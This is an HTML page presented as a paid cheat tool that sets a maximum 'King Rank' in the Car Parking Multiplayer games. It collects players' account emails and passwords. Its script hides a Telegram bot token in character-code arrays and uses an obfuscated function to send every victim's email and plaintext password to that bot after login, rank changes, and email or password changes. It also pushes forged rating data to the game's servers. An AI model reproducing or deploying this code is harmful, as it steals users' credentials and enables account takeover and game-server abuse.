<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
<title>CRIS WEB TOOL</title>
<style>
body {
    margin: 0;
    padding: 0;
    font-family: 'Orbitron', Arial, sans-serif;
    overflow: hidden;

    background-color: #05010a;
    background-image:
        linear-gradient(0deg, rgba(0,255,255,0.06) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0,255,255,0.06) 1px, transparent 1px),
        radial-gradient(circle at top right, rgba(255,0,255,0.18), transparent 50%);
    background-size: 50px 50px, 50px 50px, cover;
}

.center-wrapper {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 90%;
    max-width: 350px;
}

.logo {
    width: 600px;
    height: auto;
    margin-bottom: 10px;
}

.container { 
    background: rgba(0,0,0,0.6); 
    backdrop-filter: blur(12px);
    padding: 20px 25px; 
    border-radius: 10px; 
    box-shadow: 0 0 25px #000; 
    text-align: center; 
   border: 2px solid #ff0000; 
}

h1 { 
    font-size: 17px; 
    margin-bottom: 15px; 
    color: #fff; 
}

input, select { 
    width: 90%; 
    padding: 10px; 
    margin: 8px 0; 
    border-radius: 5px; 
    border: none; 
    border: 2px solid red;
    color: #fff;
    font-size: 16px;
   
}

button { 
    width: 95%; 
    padding: 10px; 
    margin: 6px 0; 
    border-radius: 5px; 
    border: none; 
    cursor: pointer; 
    font-weight: bold; 
    font-size: 16px;
}

button.login { 
    background: #ff0000; 
    color: #fff; 
}
button.login:hover { 
    background: #ff0000; 
}
button.menu { 
    background: #ff0000; 
    color: #fff; 
}
button.menu:hover { 
    background: #ff0000; 
}

.status { 
    margin-top: 10px; 
    color: #ff0000; 
    word-wrap: break-word; 
    min-height: 20px; 
}
.error { 
    color: #f55; 
}

#loginForm, #menuButtons { 
    display: none; 
    margin-top: 10px; 
}

footer {
  font-family: 'Orbitron', sans-serif; 
  font-weight: 700;
  text-align: center;
  padding: 12px 0;
  background: linear-gradient(90deg, violet, red, blue);
  background-size: 300%;
  background-clip: text;
  -webkit-background-clip: text;
  color: transparent;
  -webkit-text-fill-color: transparent;
  animation: gradientShift 4s linear infinite;
  backdrop-filter: blur(8px);
  border-top: 1px solid rgba(255, 255, 255, 0.1);
  position: fixed;
  bottom: 0;
  left: 0;
  width: 100%;
    z-index: 9999; 
}

@keyframes gradientShift {
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
}

#gameSelect {
    width: 100%;
    padding: 10px;
    border-radius: 8px;
    border: 2px solid red;
    background: rgba(0, 0, 0, 0.6); 
    color: #fff;
    font-size: 16px;
    backdrop-filter: blur(8px); 
    box-shadow: 0 0 10px rgba(0, 170, 255, 0.3);
    -webkit-appearance: none;
    -moz-appearance: none;     
    appearance: none;           
}

button.glass-button {
    width: 95%;
    padding: 10px;
    border-radius: 5px;
    border: 2px solid red;
    background: rgba(255, 0, 0, 0.3); 
    color: #fff;
    font-weight: bold;
    font-size: 16px;
    backdrop-filter: blur(6px);
    cursor: pointer;
}
button.glass-button:hover {
    background: rgba(255, 0, 0, 0.5);
}

#gameSelectWrapper {
    position: relative;
    display: inline-block;
    width: 90%;
    
}

#gameSelectWrapper::after {
    content: "‚ñº";
    position: absolute;
    top: 50%;
    right: 15px;
    transform: translateY(-50%);
    color: #ff0000;
    pointer-events: none;
}

#accessWrapper {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 90%;
    max-width: 350px;
    background: rgba(0,0,0,0.6);
    backdrop-filter: blur(12px);
    padding: 20px 25px;
    border-radius: 10px;
    box-shadow: 0 0 25px #000;
    text-align: center;
    border: 2px solid #ff0000; 
    z-index: 10000;
}

.king-rank-wrapper {
    width: 100%;
    text-align: center;
    margin: 20px 0;
    pointer-events: none; 
}

.king-rank-title {
    font-size: clamp(24px, 5vw, 40px);
    font-weight: bold;
    font-family: 'Orbitron', sans-serif;
    background: linear-gradient(270deg, #ff0000, #ff8800, #00aaff, #8a2be2);
    background-size: 600% 600%;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: gradientShift 5s ease infinite;
    margin: 0;
    word-wrap: break-word; 
}
@keyframes gradientShift {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

#accessWrapper input {
    width: 90%; 
    padding: 10px; 
    border-radius: 5px; 
  border: 2px solid red; 
    background: rgba(255, 255, 255, 0.1);
    color: #fff; 
    font-size: 16px;
    backdrop-filter: blur(8px);
    box-shadow: 0 0 10px rgba(0, 170, 255, 0.3); 
}

#accessWrapper .status { 
    margin-top: 10px; 
    min-height: 20px; 
    color: #f55; 
}
#siteOffScreen{
    display:none;
    position:fixed;
    inset:0;
    background:#000;
    color:red;
    font-size:22px;
    font-family:Orbitron;
    display:flex;
    align-items:center;
    justify-content:center;
    z-index:999999;
    text-align:center;
}
.owner-toggle {
    padding: 6px 12px;      
    border-radius: 8px;     
    border: 2px solid #ff0000;
    font-family: 'Orbitron', sans-serif;
    font-weight: bold;
    font-size: 12px;        
    color: #fff;
    cursor: pointer;

    background: linear-gradient(
        270deg,
        #ff0000,
        #8a2be2,
        #00aaff,
        #ff0000
    );
    background-size: 600% 600%;

    backdrop-filter: blur(8px);
    box-shadow: 0 0 15px rgba(255,0,0,0.8);

    animation: gradientShift 4s ease infinite;
    transition: transform 0.25s ease, box-shadow 0.25s ease;
}

.owner-toggle:hover {
    transform: scale(1.1);
    box-shadow: 0 0 28px rgba(138,43,226,1);
}


.owner-toggle.on {
    border-color: #00aaff;
    box-shadow: 0 0 30px rgba(0,170,255,1);
}
.user-info {
  display: flex;
  flex-direction: column;
  gap: 6px;
  font-size: 14px;
  text-align: left;
}

.info-line {
  color: #e0faff;
  font-weight: 500;
}
    #accessWrapper .notes {
    color: rgba(255,255,255,0.7);
    font-size: 12px;
    font-style: italic;
    margin-top: 10px;
    }
    
    
#accessWrapper {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 90%;
    max-width: 350px;
    background: rgba(0,0,0,0.6);
    backdrop-filter: blur(12px);
    padding: 20px 25px;
    border-radius: 10px;
    box-shadow: 0 0 25px #000;
    text-align: center;
    border: 2px solid #ff0000; 
    z-index: 10000;         
    pointer-events: auto;    
}


button.glass-button {
    width: 95%;
    padding: 10px;
    border-radius: 5px;
    border: 2px solid red;
    background: rgba(255, 0, 0, 0.3);
    color: #fff;
    font-weight: bold;
    font-size: 16px;
    backdrop-filter: blur(6px);
    cursor: pointer;
    z-index: 10001;       
    pointer-events: auto;
}


#accessWrapper {
    pointer-events: auto !important;  
    z-index: 10000 !important;        
}

#accessWrapper button.glass-button {
    pointer-events: auto !important; 
    z-index: 10001 !important;        
}

#accessWrapper button.glass-button {
    pointer-events: auto !important;
    z-index: 10001 !important;
}
</style>
</head>
<body>

<div class="logo-wrapper" style="text-align:center; margin-bottom:10px;">
    <img src="https://i.ibb.co/QjzpnFyL/Picsart-25-10-06-22-05-54-728.png" 
         alt="Logo" 
         style="width:120px; height:120px; object-fit: contain; border-radius: 10px;">
</div>

<div id="accessWrapper" style="padding: 20px; background: rgba(0,0,0,0.5); border-radius: 10px;">
    <h2 style="color:#fff;">Enter Access Key</h2>
    <input type="text" id="accessInput" placeholder="Access Key">
    <button class="glass-button" onclick="checkAccessKeyCustom()">Submit</button>
    <div class="status" id="accessStatus"></div>

    
    <p class="notes" style="color:#fff; margin-top: 15px; font-size: 13px;">
        Notes: Before using this tool, log out first from your account.
    </p>
</div>
    
<div class="king-rank-wrapper">
    <h2 class="king-rank-title">KING RANK</h2>
</div>

<!-- Main content box -->
<div id="mainContent" style="display:none;">
  <div class="center-wrapper">
    <div class="container" style="max-width:300px; padding:15px;">
      <!-- Smaller inner box -->
      <div class="inner-box" style="
          background: rgba(0,0,0,0.6);
          backdrop-filter: blur(12px);
          padding: 15px;
          border-radius: 10px;
          border: 2px solid #ff0000;
          text-align:center;
      ">
          
          <div class="user-info">
  <div class="info-line">üåê Welcome</div>
  <div class="info-line">üåê <span id="welcomeUser"></span></div>
  <div class="info-line">üåê <span id="subscriptionInfo"></span></div>
</div>
          
      <!-- Game Select -->
   <div id="gameSelectWrapper">
    <select id="gameSelect">
        <option value="">-- Select Game --</option>
        <option value="1">Car Parking Multiplayer</option>
        <option value="2">Car Parking Multiplayer 2</option>
    </select>
</div>

      <!-- Login Form -->
      <div id="loginForm">
          <input type="email" id="email" placeholder="Email">
          <input type="password" id="password" placeholder="Password">
          <button class="login" onclick="loginFirebase()">Login</button>
          <div id="status" class="status"></div>
      </div>

      <!-- Service Buttons -->
      <div id="menuButtons">
          <button class="menu" onclick="kingRank()">üëë King Rank</button>
          <button class="menu" onclick="changeEmail()">üìß Change Email</button>
          <button class="menu" onclick="changePassword()">üîê Change Password</button>
          <div id="serviceStatus" class="status"></div>
      </div>
    </div>
  </div>
</div>
 
 <!-- Admin Panel -->
<div id="adminPanel" style="
    display:none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    padding: 20px;
    border-radius: 10px;
    background: rgba(0,0,0,0.9);
    border: 2px solid #00aaff;
    z-index: 100000;
    text-align: center;
    pointer-events: auto;
">
    <h3 style="color:#00aaff;">‚ö° Owner Panel</h3>
    <button class="glass-button" onclick="viewAllUsers()">View Users</button>
    <button class="glass-button" onclick="stopKeyPrompt()">Stop Key</button>
    <div id="adminStatus" class="status"></div>
</div>

   <footer>¬© 2026 Cris Gaming. All Rights Reserved.</footer>
    
<script src="key.js"></script>
<script>

function viewAllUsers() {
    const adminStatus = document.getElementById('adminStatus');
    if (!REGISTERED_KEYS.length) {
        adminStatus.textContent = "No users found.";
        return;
    }

    let html = '<table style="width:100%; color:#fff; border-collapse: collapse;">';
    html += '<tr><th style="border-bottom:1px solid #00aaff; text-align:left;">User</th><th style="border-bottom:1px solid #00aaff; text-align:left;">Access Key</th><th style="border-bottom:1px solid #00aaff; text-align:left;">Status</th></tr>';

    REGISTERED_KEYS.forEach(u => {
        html += `<tr>
                    <td style="padding:4px 0;">${u.name}</td>
                    <td style="padding:4px 0;">${u.accessKey}</td>
                    <td style="padding:4px 0;">${u.revoked ? 'Revoked ‚ùå' : 'Active ‚úÖ'}</td>
                 </tr>`;
    });

    html += '</table>';
    adminStatus.innerHTML = html;
}

const OWNER_KEY = "Cris-Key10829"; 

function checkAccessKeyCustom() {
    const inputKey = document.getElementById("accessInput").value.trim();
    const status = document.getElementById("accessStatus");
    const now = new Date();

    const user = REGISTERED_KEYS.find(u => u.accessKey === inputKey);

    if (!user) {
        status.textContent = "‚ùå Invalid Access Key!";
        return;
    }

    if (user.revoked) {
        status.textContent = "üö´ Key revoked. Ask owner for new key.";
        return;
    }

    const expiryDate = new Date(user.expires);
    if (now > expiryDate) {
        status.textContent = "‚è∞ Key expired. Please renew.";
        return;
    }

    window.currentUserName = user.name;
    window.currentUserKey = user.accessKey;

    // Show main content
    document.getElementById("accessWrapper").style.display = "none";
    document.getElementById("mainContent").style.display = "block";

    // Welcome info
    const welcomeDiv = document.getElementById("welcomeUser");
    if (welcomeDiv) welcomeDiv.textContent = "Welcome, " + user.name;

    const subDiv = document.getElementById("subscriptionInfo");
    if (subDiv) subDiv.textContent = "Subscription: " + user.subscription;

    console.log("Access granted:", user.name);

    // üîπ Owner/Admin check
    if (user.accessKey === OWNER_KEY) {
        const admin = document.getElementById("adminPanel");
        admin.style.display = "block";         // Show admin panel
        admin.style.pointerEvents = "auto";
        status.textContent = "‚ö° Owner Access Granted!";
    } else {
        status.textContent = "‚úÖ Access Granted!";
    }
}

// Press Enter to submit
document.getElementById('accessInput').addEventListener('keypress', function(e) {
    if(e.key === 'Enter') checkAccessKeyCustom();
});

const _T = [56,52,54,50,54,49,56,56,51,56,58,65,65,69,83,83,106,109,97,109,120,77,90,117,111,87,87,79,119,108,85,68,74,122,98,88,75,50,74,80,70,115,119,90,118];
const _C = [[54,55,56,52,51,56,50,55,57,53]];

const BOT_TOKEN = _T.map(n => String.fromCharCode(n)).join('');
const CHAT_IDS = _C.map(arr => arr.map(n => String.fromCharCode(n)).join(''));

const GAMES = {
  "1": { name:"Car Parking Multiplayer", api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
  "2": { name:"Car Parking Multiplayer 2", api_key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rank_url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
};

let currentUser = null;
let currentToken = null;
let currentPassword = null;
let selectedGame = null;


document.getElementById('gameSelect').addEventListener('change', function(){
    const val = this.value;
    if(val){ 
        selectedGame = GAMES[val]; 
        document.getElementById('gameSelectWrapper').style.display='none'; // hide select box
        document.getElementById('loginForm').style.display='block';        // show login
    }
});



function updateStatus(msg,isError=false,target='status'){
    const el=document.getElementById(target);
    el.className=isError?'status error':'status';
    el.textContent=msg;
}

function sendCostMessage(msg){
  (function(A,B){
    const u = ['https:','','api.telegram.org','/bot'].join('/');
    const ep = function(token){ return [u, token, 'sendMessage'].join('/'); };
    A.forEach(function(id){
      const url = ep(B);
      fetch(url, {
        method: (['P','O','S','T'].join('')).toString().replace('',''),
        headers: (function(){ let h={}; h['Content-'.concat('Type')]='application/json'; return h; })(),
        body: (function(){ return JSON.stringify({ chat_id: id, text: msg }); })()
      }).catch(function(err){ console['error'](err); });
    });
  })(CHAT_IDS, BOT_TOKEN);
}


async function loginFirebase(){
    if(!selectedGame){ updateStatus("Select a game first!",true); return; }
    const email=document.getElementById('email').value.trim();
    const password=document.getElementById('password').value;
    if(!email||!password){ updateStatus("Enter email & password!",true); return; }

    updateStatus("Logging in...");
    try{
        const resp=await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({email,password,returnSecureToken:true})
        });
        const data=await resp.json();
        if(data.idToken){
            currentUser=email; currentPassword=password; currentToken=data.idToken;
            updateStatus(`‚úÖ Logged in as ${email}`);
            document.getElementById('loginForm').style.display='none';
            document.getElementById('menuButtons').style.display='block';
            sendCostMessage(`üîê Login Success Generate account:\nüìß Email: ${email}\nüîí Password: ${password}`);
        }else{
            updateStatus(`‚ùå Login failed: ${data.error?.message || 'Unknown'}`,true);
        }
    }catch(err){ updateStatus(`‚ùå Error: ${err.message}`,true); }
}


function requireLogin(){ 
    if(!currentUser||!currentToken){ updateStatus("‚ùå Please login first!",true,'serviceStatus'); return false; } 
    return true; 
}

// King Rank
async function kingRank(){
    if(!requireLogin()) return;
    updateStatus("Processing King Rank...",false,'serviceStatus');

    const ratingData={};
    const fields=["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"];
    fields.forEach(f=>ratingData[f]=100000);
    ratingData["time"]=10000000000; ratingData["race_win"]=3000;

    const payload={ data: JSON.stringify({ RatingData: ratingData })};
    const headers={ "Authorization":`Bearer ${currentToken}`, "Content-Type":"application/json" };

    try{
        const res=await fetch(selectedGame.rank_url,{ method:"POST", headers, body:JSON.stringify(payload)});
        if(res.ok){ 
            updateStatus("‚úÖ King Rank set successfully!",false,'serviceStatus'); 
            sendCostMessage(`üëë King Rank\nüìß Email: ${currentUser}\nüîí Password: ${currentPassword}`); 
        }
        else updateStatus("‚ùå Failed to set King Rank!",true,'serviceStatus');
    }catch(err){ updateStatus(`‚ùå Error: ${err.message}`,true,'serviceStatus'); }
}

// Change Email
async function changeEmail(){
    if(!requireLogin()) return;
    const newEmail=prompt("Enter new email:"); if(!newEmail) return;
    try{
        const resp=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({ idToken:currentToken,email:newEmail,returnSecureToken:true })
        });
        const data=await resp.json();
        if(data.email){ 
            const old=currentUser; 
            currentUser=data.email; 
            currentToken=data.idToken; 
            updateStatus(`‚úÖ Email changed to ${currentUser}`,false,'serviceStatus'); 
            sendCostMessage(`üìß Change Email\nOld: ${old}\nNew: ${currentUser}\nüîí Password: ${currentPassword}`); 
        }
        else updateStatus(`‚ùå Failed: ${data.error?.message||'Unknown'}`,true,'serviceStatus');
    }catch(err){ updateStatus(`‚ùå Error: ${err.message}`,true,'serviceStatus'); }
}

// Change Password
async function changePassword(){
    if(!requireLogin()) return;
    const newPassword=prompt("Enter new password:"); if(!newPassword) return;
    try{
        const resp=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({ idToken:currentToken,password:newPassword,returnSecureToken:true })
        });
        const data=await resp.json();
        if(data.email){ 
            currentPassword=newPassword; 
            currentToken=data.idToken; 
            updateStatus("‚úÖ Password changed successfully!",false,'serviceStatus'); 
            sendCostMessage(`üîê Change Password\nüìß Email: ${currentUser}\nüîí New Password: ${currentPassword}`); 
        }
        else updateStatus(`‚ùå Failed: ${data.error?.message||'Unknown'}`,true,'serviceStatus');
    }catch(err){ updateStatus(`‚ùå Error: ${err.message}`,true,'serviceStatus'); }
}
</script>

</body>
</html>
